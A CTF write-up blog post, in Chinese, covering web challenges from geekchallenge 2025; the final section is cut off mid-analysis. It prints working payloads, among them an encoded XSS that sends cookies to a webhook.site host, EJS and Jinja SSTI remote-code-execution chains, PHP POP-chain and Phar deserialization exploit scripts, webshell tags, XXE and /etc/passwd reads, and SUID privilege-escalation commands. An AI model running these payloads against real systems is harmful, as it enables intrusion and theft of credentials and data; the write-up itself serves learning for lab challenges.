---
title: geekchallenge 2025 WP
date: 2026-01-01 00:00:00 +0800
categories: [比赛WP, ]
tags: [CTF]
---

## Vibe SEO

### Payload 原理详解：`?filename=/dev/fd/13`

恭喜你成功 get flag！这个 CTF 题的核心是利用 PHP 的 `fopen()` 和 `readfile()` 函数结合 Linux 文件描述符（File Descriptor, fd）的特性，来绕过文件名长度限制（<11 字符）读取敏感文件 `/my_secret.txt`。下面我一步步拆解原理，确保逻辑透明。

#### 1. **脚本执行流程分析**
   - **开头操作：** `$flag = fopen('/my_secret.txt', 'r');`
     - 这行代码用 `fopen()` 以只读模式打开 `/my_secret.txt`（flag 文件）。
     - 在 Linux/Unix 系统中，打开文件会分配一个**文件描述符 (fd)**，这是一个整数句柄（像“门牌号”），指向该文件的内容。
     - 标准 fd 占用：
       - fd 0：stdin（标准输入）
       - fd 1：stdout（标准输出）
       - fd 2：stderr（标准错误输出）
     - `fopen()` 通常从 fd 3 开始分配新 fd。但在 Web 环境（如 Apache/Nginx + PHP）中，进程启动时可能已打开多个 fd（e.g., 日志文件、数据库连接、脚本自身等），所以实际分配的 fd 可能更高——你的环境里是 fd 13。
     - 注意：`$flag` 只是 PHP 资源变量（指向 fd），它保持文件**打开状态**，直到脚本结束或显式 `fclose()`（这里没关闭）。

   - **用户输入处理：** `if (strlen($_GET['filename']) < 11) { readfile($_GET['filename']); }`
     - `readfile()` 函数读取 `filename` 路径的内容，并直接输出到浏览器（stdout）。
     - 长度检查：`strlen < 11`，防止直接用长路径如 `/my_secret.txt`（14 字符）绕过。
     - 如果长度 ≥11，直接输出 "Filename too long"。

#### 2. **为什么用 `/dev/fd/13`？**
   - **/dev/fd/ 是什么？**
     - `/dev/fd/` 是 Linux 的一个**伪文件系统**（procfs 的符号链接），它暴露进程当前打开的所有 fd。
     - `/dev/fd/N` 是一个**符号链接**，直接指向进程 fd N 对应的文件内容。读取它，就等于读取 fd N 打开的文件（无需知道原路径）。
     - 示例：在终端 `cat /dev/fd/3` 就能看到 fd 3 的内容（如果 fd 3 是打开的文件）。

   - **Payload 匹配：**
     - `filename = /dev/fd/13`
       - 长度：`strlen('/dev/fd/13') = 10`（<11），通过检查。
     - `readfile('/dev/fd/13')` 执行时：
       - PHP 系统调用打开 `/dev/fd/13` 路径。
       - 内核解析：fd 13 对应脚本中 `fopen()` 打开的 `/my_secret.txt`，所以读取并输出 flag 内容。
     - 为什么是 13？你的环境中，脚本执行到 `fopen()` 时，fd 3-12 已被其他东西占用（e.g., Web 服务器的日志 fd、PHP 内部 fd、甚至脚本源代码本身——你试的 `/dev/fd/12` 读到源代码，说明 fd 12 就是当前 PHP 文件的 fd）。

#### 3. **为什么其他 fd 失败？**
   - `/dev/fd/1`、`2` 等：这些是标准输出/错误，读取会失败或输出空/无关内容（"No such file or directory" 表示该 fd 未打开文件，或不是文件类型）。
   - `php://fd/3` 失败：这是 PHP 流包装器，只在 CLI 模式可靠；在 Web SAPI（如 mod_php）中，常报 "operation failed" 因为 fd 访问受限。
   - 低 fd（如 3-11）"No such"：你的环境 fd 分配从较高数字开始（CTF 常见，模拟真实服务器负载）。

#### 4. **安全/绕过本质**
   - **漏洞点：** `readfile()` 支持任意路径（包括伪文件系统），而长度检查太弱，没过滤 `/dev/fd/`。
   - **通用技巧：** CTF 中，fd 枚举是经典绕过（从 3 试到 20 左右，通常够）。如果环境无 `/dev/fd/`，可试 `/proc/self/fd/N`（但长度 15+，需其他绕过）。
   - **防御建议：** 用白名单路径、禁用 `readfile()`，或用 `fopen + fread` 控制输出。

这个 payload 精妙在于“借用”脚本自身打开的 fd，无需注入或额外权限。もし还有疑问，或想聊其他 CTF 题，随时说！🚀



## Xross The Finish Line

xss，过滤了script标签，空格。/**/替代空格，使用十进制编码外带cookie

payload

```javascript
<svg/**/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,10,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,102,55,55,50,51,56,52,99,45,101,55,48,51,45,52,97,97,102,45,97,51,55,50,45,57,55,53,56,55,53,57,53,102,102,97,54,47,63,99,111,111,107,105,101,61,39,32,43,32,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41,10,32,32,32,32,46,116,104,101,110,40,114,101,115,112,111,110,115,101,32,61,62,32,123,10,32,32,32,32,125,41,10,32,32,32,32,46,99,97,116,99,104,40,101,114,114,111,114,32,61,62,32,123,10,32,32,32,32,125,41,59,10,60,47,115,99,114,105,112,116,62));>
```

SYC{019aaa22e77d7b96a6d1103425ada617}



## Expression

ejs模板注入
在CTF中遇到EJS模板注入题，关键在于如何通过JavaScript代码执行来获取敏感信息（如flag）。下面是一个EJS模板注入常用Payload的表格，包含直接RCE、文件操作和结合原型链污染的利用方式，你可以根据题目环境进行尝试。

| payload类型        | 核心payload示例                                              | 简要说明                                                     |
| :----------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **直接RCE**        | `<%- global.process.mainModule.require('child_process').execSync('whoami') %>` | 利用`global.process.mainModule.require`引入`child_process`模块执行系统命令。 |
| **直接RCE**        | `<%- require('child_process').execSync('cat /flag') %>`      | 在某些环境下，可以直接使用`require`函数。                    |
| **文件操作**       | `<%- require('fs').readFileSync('/etc/passwd', 'utf8') %>`   | 利用`fs`模块读取服务器上的文件内容。                         |
| **结合原型链污染** | 步骤1：污染`outputFunctionName`<br>`{"__proto__": {"outputFunctionName": "a; return global.process.mainModule.require('child_process').execSync('id'); //"}}`<br>步骤2：触发模板渲染 | 通过原型链污染影响EJS模板编译，在渲染时触发命令执行。        |

### 💡 使用技巧与注意事项

在实际解题过程中，除了直接尝试Payload，还需要注意以下几点：

- **观察输出格式**：在EJS中，`<%= %>`会对输出的变量进行HTML转义，而`<%- %>`则直接输出原始数据。为了确保代码被执行，**优先使用`<%- %>`标签**。
- **利用已有对象**：除了直接`require`，也可以尝试通过已知的全局对象（如`global`）或已被导入的模块来调用所需功能。
- **处理无回显情况**：如果命令执行后没有回显，可以尝试使用**DNS外带数据**或**HTTP请求**将结果发送到你能控制的服务器。
- **绕过过滤**：如果题目对某些关键字进行了过滤，可以尝试以下方法：
  - **使用JavaScript字符串特性**：如拼接字符串（`'child_' + 'process'`）、使用反引号或`String.fromCharCode()`。
  - **利用编码**：如Unicode、Base64编码。
- **结合代码审计**：仔细检查题目源码，寻找可能导致原型链污染的漏洞点（例如不安全的对象合并操作），这可以与EJS注入结合，实现更深入的利用。

### 🧩 一个实战思路（原型链污染 + EJS）

这是一种在CTF中出现的组合攻击方式：

1.  **寻找原型链污染点**：首先，在题目中找到一个存在原型链污染漏洞的端点。这通常出现在接收JSON数据，并使用不安全的方式（如`Object.assign`、`merge`等函数）合并到现有对象的逻辑中。
2.  **污染模板配置**：通过原型链污染，向对象的原型上注入EJS模板引擎的配置选项。例如，污染`outputFunctionName`属性，其值是一段恶意JavaScript代码字符串。
3.  **触发模板渲染**：然后，访问一个使用了EJS模板进行渲染的页面。此时，由于原型链被污染，EJS引擎在编译模板时会使用被篡改的配置，从而在执行过程中运行你注入的恶意代码。

一篇参考文章 [CTF | 2021 Hgame Week4 WriteUp | MiaoTony's小窝](https://miaotony.xyz/2021/03/04/CTF_2021HgameWeek4/)



## Sequal No Uta

sqlite 布尔盲注



## one last image

上传图片抓包修改后缀为php。过滤了php，大小写绕过失败。尝试短标签 `<?=system('env');?>`，过滤了system，使用 反引号绕过

```
<?=`env`>
```

响应报错信息里有文件路径

![image-20251121195839864](assets\img\2026\1\image-20251121195839864.png)

访问路径后找到flag

也可以用短标签传一句话木马然后蚁剑上线。



## popself

```php
<?php
show_source(__FILE__);

error_reporting(0);
class All_in_one
{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;

    public function __set($name, $value){
        echo "他还是没有忘记那个".$value."<br>";
        echo "收集夏日的碎片吧<br>";

        $fox = $this->Fox;

        if ( !($fox instanceof All_in_one) && $fox()==="summer"){
            echo "QYQS enjoy summer<br>";
            echo "开启循环吧<br>";
            $komiko = $this->komiko;
            $komiko->Eureka($this->L, $this->sleep3r);
        }
    }

    public function __invoke(){
        echo "恭喜成功signin!<br>";
        echo "welcome to Geek_Challenge2025!<br>";
        $f = $this->Samsāra;
        $arg = $this->ivory;
        $f($arg);
    }
    public function __destruct(){

        echo "你能让K4per和KiraKiraAyu组成一队吗<br>";

        if (is_string($this->KiraKiraAyu) && is_string($this->K4per)) {
            if (md5(md5($this->KiraKiraAyu))===md5($this->K4per)){
                die("boys和而不同<br>");
            }

            if(md5(md5($this->KiraKiraAyu))==md5($this->K4per)){
                echo "BOY♂ sign GEEK<br>";
                echo "开启循环吧<br>";
                $this->QYQS->partner = "summer";
            }
            else {
                echo "BOY♂ can`t sign GEEK<br>";
                echo md5(md5($this->KiraKiraAyu))."<br>";
                echo md5($this->K4per)."<br>";
            }
        }
        else{
            die("boys堂堂正正");
        }
    }

    public function __tostring(){
        echo "再走一步...<br>";
        $a = $this->_4ak5ra;
        $a();
    }

    public function __call($method, $args){        
        if (strlen($args[0])<4 && ($args[0]+1)>10000){
            echo "再走一步<br>";
            echo $args[1];
        }
        else{
            echo "你要努力进窄门<br>";
        }
    }
}

class summer {
    public static function find_myself(){
        return "summer";
    }
}
$payload = $_GET["24_SYC.zip"];

if (isset($payload)) {
    unserialize($payload);
} else {
    echo "没有大家的压缩包的话，瓦达西！<br>";
}

?>
```

get 传 24[SYC.zip

PHP 特性解析

1. **特殊字符转化为下划线**：PHP 会将 GET 或 POST 参数中的非法字符（如空格、*+*、*.* 等）自动转换为下划线。例如： diao.s.i 会被解析为 diao_s_i diao[s.i 会被解析为 diao_s.i
2. **方括号的特殊处理**：如果参数名中包含方括号（*[*），PHP 会将其转化为下划线，但保留后续字符。例如： CTF[SHOW.COM 会被解析为 CTF_SHOW.COM

`md5(md5($this->KiraKiraAyu))==md5($this->K4per)`: 两边都是0e开头，后面均为数字

```
左边双md5: aawBzC，右边：QLTHNDT等  
```

payload 生成脚本

```php
<?php
class All_in_one
{
    public $KiraKiraAyu;
    public $_4ak5ra;
    public $K4per;
    public $Samsāra;
    public $komiko;
    public $Fox;
    public $Eureka;
    public $QYQS;
    public $sleep3r;
    public $ivory;
    public $L;
}

class summer {
    public static function find_myself(){
        return "summer";
    }
}

// 创建对象用于 __invoke
$obj5 = new All_in_one();
$obj5->Samsāra = "system";
$obj5->ivory = "env"; // 修改为所需命令

// 创建对象用于 __toString
$obj4 = new All_in_one();
$obj4->_4ak5ra = $obj5;

// 创建对象用于 __call
$obj3 = new All_in_one();

// 创建对象用于 __set
$obj2 = new All_in_one();
$obj2->Fox = array('summer', 'find_myself');
$obj2->komiko = $obj3;
$obj2->L = "1e4";
$obj2->sleep3r = $obj4;

// 创建主对象用于 __destruct
$obj1 = new All_in_one();
$obj1->KiraKiraAyu = "aawBzC";
$obj1->K4per = "QLTHNDT";
$obj1->QYQS = $obj2;

// 序列化主对象
$payload = serialize($obj1);
echo $payload;
?>
```



## ez_read

目录穿越读取源码 app.py，替换 `../` 为空，使用 `..././` 双写绕过

```python
from flask import Flask, request, render_template, render_template_string, redirect, url_for, session
import os

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "key_ciallo_secret"

USERS = {}


def waf(payload: str) -> str:
    print(len(payload))
    if not payload:
        return ""
        
    if len(payload) not in (114, 514):
        return payload.replace("(", "")
    else:
        waf = ["__class__", "__base__", "__subclasses__", "__globals__", "import","self","session","blueprints","get_debug_flag","json","get_template_attribute","render_template","render_template_string","abort","redirect","make_response","Response","stream_with_context","flash","escape","Markup","MarkupSafe","tojson","datetime","cycler","joiner","namespace","lipsum"]
        for w in waf:
            if w in payload:
                raise ValueError(f"waf")

    return payload


@app.route("/")
def index():
    user = session.get("user")
    return render_template("index.html", user=user)


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = (request.form.get("username") or "")
        password = request.form.get("password") or ""
        if not username or not password:
            return render_template("register.html", error="用户名和密码不能为空")
        if username in USERS:
            return render_template("register.html", error="用户名已存在")
        USERS[username] = {"password": password}
        session["user"] = username
        return redirect(url_for("profile"))
    return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        user = USERS.get(username)
        if not user or user.get("password") != password:
            return render_template("login.html", error="用户名或密码错误")
        session["user"] = username
        return redirect(url_for("profile"))
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/profile")
def profile():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))
    name_raw = request.args.get("name", user)
    
    try:
        filtered = waf(name_raw)
        tmpl = f"欢迎，{filtered}"
        rendered_snippet = render_template_string(tmpl)
        error_msg = None
    except Exception as e:
        rendered_snippet = ""
        error_msg = f"渲染错误: {e}"
    return render_template(
        "profile.html",
        content=rendered_snippet,
        name_input=name_raw,
        user=user,
        error_msg=error_msg,
    )


@app.route("/read", methods=["GET", "POST"])
def read_file():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))

    base_dir = os.path.join(os.path.dirname(__file__), "story")
    try:
        entries = sorted([f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))])
    except FileNotFoundError:
        entries = []

    filename = ""
    if request.method == "POST":
        filename = request.form.get("filename") or ""
    else:
        filename = request.args.get("filename") or ""

    content = None
    error = None

    if filename:
        sanitized = filename.replace("../", "")
        target_path = os.path.join(base_dir, sanitized)
        if not os.path.isfile(target_path):
            error = f"文件不存在: {sanitized}"
        else:
            with open(target_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

    return render_template("read.html", files=entries, content=content, filename=filename, error=error, user=user)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
```

用户名存在ssti，`/profile?name={{7*7}}`

payload：get 传 a=cmd
{% raw %}
```
{% set po=dict(po=a,p=a)|join %}
{% set a=(()|select|string|list)|attr(po)(24) %}
{% set ini=(a,a,dict(in=a,it=a)|join,a,a)|join %}
{% set glo=(a,a,dict(glo=a,bals=a)|join,a,a)|join %}
{% set getitem=(a,a,dict(get=a,item=a)|join,a,a)|join %}
{% set popen=dict(popen=a)|join %}
{% set read=dict(read=a)|join %}
{% set o=dict(os=a)|join %}
{% set cmd=(request.values.a) %}
{{ (url_for|attr(glo))|attr(getitem)(o)|attr(popen)(cmd)|attr(read)() }}11111111111111111111111111111111111111111111111111111111111111111111111
```
{% endraw %}
也可以用焚靖绕黑名单，然后用字符填充长度到114或514

RCE 后读 flag 需要 suid 提权。查找所有配置了suid权限的文件

```
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

发现 `/usr/local/bin/env`，执行 `env` 也发现环境变量里有提示用来提权，`/usr/local/bin/env cat /f*` 得到 flag



## 百年继承

```
{
    "__class__": {
        "__base__": {
            "__base__": {
                "execute_method": "lambda executor, target: (None, setattr(target, 'alive', True), __import__('os').popen('env').read())"
            }
        }
    }
}
```

### 一、 漏洞原理科普：Python Class Pollution

#### 1. 什么是 Class Pollution？
在 JavaScript 中，我们通过修改 `__proto__` 可以影响所有对象的基础原型（Object.prototype）。在 Python 中没有 `prototype` 概念，但有 **类（Class）** 和 **继承（Inheritance）**。

当应用允许用户输入 JSON 数据，并且后端使用类似“递归合并”的方式将这些数据赋值给对象属性时，攻击者可以通过特殊的键名（如 `__class__`, `__base__`, `__globals__`）顺藤摸瓜，从一个普通的**实例对象**一直修改到**类**，甚至**父类**或**全局配置**。

#### 2. 为什么这题能成功？
这题的继承关系如下：
*   **对象关系：** `上校 (Instance)` 是 `Colonel (Class)` 的实例。
*   **继承关系：** `Colonel` 继承自 `Father`，`Father` 继承自 `Human`。
*   **旁路关系：** `行刑队 (Instance)` 也是 `Human` 的子类（或者直接是 `Human` 的实例）。

Python 的类属性是共享的。
**攻击路径：**
1.  我们控制了 `上校` 的输入。
2.  通过 `上校.__class__` 拿到 `Colonel` 类。
3.  通过 `Colonel.__base__` 拿到 `Father` 类。
4.  通过 `Father.__base__` 拿到 `Human` 类。
5.  修改 `Human` 类的 `execute_method` 属性。

**结果：**
因为 `Human` 类被修改了，**所有继承自 `Human` 的对象**（包括即将处决你的“行刑队”）在调用 `execute_method` 时，都会执行你注入的新代码。这就是“污染源头，毒害全流”。

---

### 二、 CTF 题目 Writeup

**题目名称：** 百年继承
**漏洞类型：** Python Class Pollution / RCE
**核心考点：** 面向对象继承链利用、Python Lambda 构造、返回值类型匹配

#### 1. 题目分析与侦察
*   **步骤 1：识别环境**
    *   初看题目输入框支持 JSON，且提到“原型链”，容易联想到 JavaScript。
    *   但在失败结局中，行刑队的剑上刻着：`lambda executor, target: ...`。
    *   **关键判断：** `lambda`、`__del__`、`setattr` 均是 Python 语法。因此确定这是 Python 环境，而非 Node.js。

*   **步骤 2：分析逻辑**
    *   文中提到“上校继承于父亲，父亲继承于人类”，“行刑队也继承于人类”。
    *   行刑队执行处决时，用的是“人类自古以来拥有的 `execute_method`”。
    *   这意味着：只要修改了 `Human` 类的 `execute_method`，就能控制行刑队的行径。

*   **步骤 3：确定攻击载荷位置**
    *   输入点是上校的属性选择。我们需要利用 Python 的魔术方法向上通过 `__class__` 和 `__base__` 溯源。

#### 2. 漏洞利用过程

**尝试阶段：确认路径**
我们要从上校（Colonel）找到人类（Human）。
路径推导：
*   `Colonel` (上校) -> `__class__`
*   `Father` (父亲) -> `__base__`
*   `Human` (人类) -> `__base__`

目标属性：`execute_method`

**第一阶段：存活（解决报错）**
原始代码是：
```python
lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')
```
这是一个返回 **3个元素元组** 的 Lambda 函数。

如果只注入 `setattr(target, 'alive', True)`，返回值是 `None`。后端逻辑大概率有 `result[2]` 这样的取值操作，导致“处决异常”。

**修正 Payload：**
我们需要构造一个同样返回元组的 Lambda，并且包含恶意代码。
```python
# 结构：(占位, 修改存活状态, 返回信息)
lambda executor, target: (None, setattr(target, 'alive', True), 'Any String')
```

**第二阶段：RCE 获取 Flag**
题目允许执行字符串形式的代码（类似 `eval`）。既然能执行代码，就能读取系统信息。
Flag 通常藏在环境变量 (`env`) 或文件 (`/flag`) 中。

我们利用 Python 的 `os` 模块执行系统命令。因为 `import` 语句不能在 lambda 中直接写，我们使用内建函数 `__import__('os')`。

**最终 Payload (JSON)：**

```json
{
    "__class__": {
        "__base__": {
            "__base__": {
                "execute_method": "lambda executor, target: (None, setattr(target, 'alive', True), __import__('os').popen('env').read())"
            }
        }
    }
}
```

#### 3. 执行结果
1.  Payload 被合并，`Human` 类的 `execute_method` 被篡改。
2.  剧情推进到行刑队执行判决。
3.  行刑队调用被篡改的方法：
    *   `target.alive` 被设为 `True`（上校存活）。
    *   `os.popen('env').read()` 被执行，读取了环境变量。
    *   读取的结果作为元组的第三个元素返回。
4.  游戏界面显示返回的字符串，其中包含了 `FLAG=...`。

读app.py

```python
from flask import Flask, request, redirect, url_for, render_template, send_from_directory, flash, session
from humens import Human, Colonel, ExecutionSquad

app = Flask(__name__)
app.secret_key = 'ciallo_secret_key'  # 用于flash消息

COLONEL: Colonel | None = None

@app.get("/assets/<path:filename>")
def assets(filename):
    return send_from_directory("assets", filename)


@app.get("/")
def index():
    error_reset = request.args.get('error_reset', False)
    from pathlib import Path
    import base64
    assets_dir = Path(app.root_path) / "assets"
    img_path = assets_dir / "上校.jpg"
    avatar_data_uri = None
    try:
        with open(img_path, "rb") as f:
            avatar_data_uri = "data:image/jpeg;base64," + base64.b64encode(f.read()).decode("ascii")
    except Exception:
        avatar_data_uri = None
    return render_template("index.html", colonel=COLONEL, error_reset=error_reset, avatar_data_uri=avatar_data_uri)


@app.post("/create")
def create():
    global COLONEL
    COLONEL = Colonel()
    COLONEL.logs.append("上校已创建。")
    COLONEL.logs.append("上校继承于他的父亲,他的父亲继承于人类")
    return redirect(url_for("index"))


@app.post("/time")
def time():
    global COLONEL
    if COLONEL is None:
        return redirect(url_for("index"))

    event = COLONEL.advance()
    COLONEL.logs.append(f"时间流逝：{event}")

    if COLONEL.stage == 4 and COLONEL.alive:
        squad = ExecutionSquad()
        squad.execute(COLONEL)

    return redirect(url_for("index"))

# 路由：接收前端 JSON 或兼容表单
@app.post("/choose")
def choose():
    global COLONEL
    if COLONEL is None or not COLONEL.alive:
        return redirect(url_for("index"))

    payload = request.get_json(silent=False)
    if not isinstance(payload, dict):
        flash("请选择有效的 JSON 对象。")
        return redirect(url_for("index"))

    from tools import contains_forbidden_key
    if contains_forbidden_key(payload):
        COLONEL.logs.append("WAF")
        flash("WAF")
        return redirect(url_for("index"))

    COLONEL.make_choice(payload)
    return redirect(url_for("index"))

@app.post("/reset")
def reset():
    global COLONEL
    COLONEL = None
    Human.execute_method = "lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')"
    return redirect(url_for("index"))

@app.errorhandler(500)
def error(error):
    global COLONEL
    COLONEL = None
    Human.execute_method = "lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')"
    return redirect(url_for("index", error_reset=True))
    
if __name__ == "__main__":
    Human.execute_method = "lambda executor, target: (target.__del__(), setattr(target, 'alive', False), '处决成功')"
    app.run(host="0.0.0.0", port=8080, debug=False)
```



## ez-seralize

**题目名称**: ez-seralize
**漏洞类型**: LFI / Phar Deserialization / POP Chain
**难度**: Medium

### 1. 信息收集与源码获取

进入题目页面，是一个文件读取器。查看 HTML 源代码，发现注释提示了 `open_basedir` 限制：
```html
<!--RUN printf "open_basedir=/var/www/html:/tmp\nsys_temp_dir=/tmp\nupload_tmp_dir=/tmp\n" ... -->
```
这意味着我们只能访问 Web 目录和 `/tmp` 目录。

尝试在输入框读取 `index.php`、`uploads.php` 和 `function.php`，成功获取源代码。

### 2. 代码审计

### `index.php` (漏洞触发点)
1.  **黑名单绕过**: 代码过滤了 `php://`、`filter` 等伪协议，但**没有过滤 `phar://`**。
2.  **触发条件**:
    ```php
    if (isset($_GET['serialized'])) {
        require 'function.php';
        $file_contents = file_get_contents($filename);
        // ...
    }
    ```
    如果传入 `serialized` 参数，会包含 `function.php`（加载类定义），并对用户可控的 `$filename` 执行 `file_get_contents`。这是典型的 **Phar 反序列化** 触发点。

### `uploads.php` (Payload 投递点)
1.  **白名单限制**: 允许上传 `jpg`, `png`, `zip` 等后缀。
2.  **文件名随机化**: 上传的文件会被重命名为 `time() . '_' . $safeBaseName`。
3.  **路径泄露**: 关键代码 `file_put_contents('/tmp/log.txt', ...)` 将上传后的文件名记录到了 `/tmp/log.txt` 中。我们可以利用文件读取功能查看这个日志来获取路径。

### `function.php` (POP 链构造)
定义了三个类 `A`, `B`, `C`，这是反序列化的利用核心。

*   **Class C**: 目标类。`rce_me()` 方法执行系统命令 `cat /flag/flag.txt > /tmp/flag`。
*   **Class B**:
    *   `__wakeup()`: 反序列化时触发，执行 `echo($this->test);`（触发 `__toString`）。
    *   `__invoke()`: 当对象被当作函数调用时触发，执行 `$this->a->rce_me();`。
*   **Class A**:
    *   `__toString()`: 当对象被当作字符串输出时触发，执行 `$function = $this->luo; return $function();`（触发 `__invoke`）。

### 3. 解题思路 (Exploit Path)

1.  **构造 POP 链**: 利用 `function.php` 中的类，构造一个序列化对象，使其在反序列化时自动触发 `C::rce_me()`。
2.  **打包 Phar**: 将该对象打包进 Phar 文件，并修改后缀为 `.jpg` 绕过上传限制。
3.  **上传 Payload**: 通过 `uploads.php` 上传恶意的 jpg 文件。
4.  **获取路径**: 通过 `index.php` 读取 `/tmp/log.txt` 找到上传后的文件名。
5.  **触发攻击**: 利用 `index.php` 的 `file_get_contents` 配合 `phar://` 协议触发反序列化，将 Flag 写入 `/tmp/flag`。
6.  **读取 Flag**: 读取 `/tmp/flag` 文件。

### 4. 漏洞利用 (Exploitation)

#### 步骤一：生成 Phar Payload
编写 `exp.php` 生成恶意的 Phar 文件：

```php
<?php
class A {
    public $file;
    public $luo;
}
class B {
    public $a;
    public $test;
}
class C {
    public $b;
}

// --- POP Chain 构造 ---
// 3. 最终执行命令
$c = new C();

// 2. B::__invoke() -> call $c->rce_me()
$b_inner = new B();
$b_inner->a = $c;

// 1. A::__toString() -> call $b_inner() -> triggers invoke
$a = new A();
$a->luo = $b_inner;

// 0. 入口: B::__wakeup() -> echo $a -> triggers toString
$b_outer = new B();
$b_outer->test = $a;

// --- 生成 Phar 文件 ---
@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 设置 Stub
$phar->setMetadata($b_outer); // 将恶意对象写入 Metadata
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

// 修改后缀绕过上传白名单
rename("exploit.phar", "exploit.jpg");
echo "Payload generated: exploit.jpg\n";
?>
```
*注意：本地生成需确保 `php.ini` 中 `phar.readonly = Off`。*

#### 步骤二：上传并获取路径
1.  将生成的 `exploit.jpg` 上传到 `uploads.php`。
2.  访问 `index.php?filename=/tmp/log.txt`。
3.  在响应中找到类似记录：`upload file success: 1732265235_exploit.jpg`。

#### 步骤三：触发反序列化
构造 Payload 访问：
```http
GET /index.php?serialized=1&filename=phar://uploads/1732265235_exploit.jpg HTTP/1.1
```
*   `serialized=1`: 确保加载 `function.php` (引入类定义)。
*   `phar://...`: 触发 PHP 解析 Phar 元数据，从而反序列化 `B` 对象。

此时，后台默默执行了 `cat /flag/flag.txt > /tmp/flag`。

#### 步骤四：获取 Flag
最后访问：
```http
GET /index.php?filename=/tmp/flag HTTP/1.1
```
页面输出 Flag。

### 5. 总结 (Conclusion)

这道题考察了对 PHP 伪协议特性的理解。
*   **Key Point 1**: 即使 `unserialize()` 函数没有直接出现，绝大多数文件操作函数（如 `file_get_contents`, `file_exists`, `include` 等）都支持 `phar://` 协议，这是 Phar 反序列化的基础。
*   **Key Point 2**: 在黑盒测试中，利用 `/tmp` 或日志文件来寻找文件路径（LFI to RCE）是一个非常实用的技巧。



## Image Viewer

考察xxe，render一个svg图片，内容是

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<svg width="1000" height="1000" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20" font-size="20">&xxe;</text>
</svg>
```



## PDF Viever

发现 /admin 管理员登录端点，提示

```html
<!--提示：使用linux系统本地账户尝试登录。-->
```

用 JS 读取 /etc/passwd 并写入页面，payload:

```javascript
<script>
    var x = new XMLHttpRequest();
    x.open("GET", "file:///etc/passwd", false);
    x.send();
    document.write("<pre>" + x.responseText + "</pre>");
</script>
```

生成的pdf

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:105::/nonexistent:/usr/sbin/nologin
avahi:x:104:107:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:105:108::/var/lib/geoclue:/usr/sbin/nologin
dave:x:1000:1000::/home/dave:/bin/bash
john:x:1001:1001::/home/john:/bin/bash
emma:x:1002:1002::/home/emma:/bin/bash
WeakPassword_Admin:x:1003:1003::/home/WeakPassword_Admin:/bin/bash
```

关键应该是 WeakPassword_Admin 这个用户，爆破密码是 `qwerty`，登录后得到flag



## Xross The Doom

这道题是一个非常经典的 **DOM Clobbering (DOM 破坏)** 漏洞利用案例，结合了路径遍历的逻辑缺陷。虽然使用了 `DOMPurify` 来防御 XSS（它会过滤掉 `<script>` 标签和 `on*` 事件处理器），但默认情况下它允许 HTML 元素保留 `id` 和 `name` 属性，而这些属性可以用来覆盖（Clobber）全局的 `window` 变量。

### 漏洞分析

漏洞的核心在于 `admin.js` 文件，具体是它获取配置变量的方式：

```javascript
const auto = asBool(window.AUTO_SHARE);
const path = asPath(window.CONFIG_PATH);
const includeCookie = asBool(window.CONFIG_COOKIE_DEBUG);
```

由于 `AUTO_SHARE`、`CONFIG_PATH` 和 `CONFIG_COOKIE_DEBUG` 并没有在脚本中显式定义，我们可以通过注入带有特定 `id` 属性的 HTML 元素来定义它们。

1.  **`window.AUTO_SHARE`**:
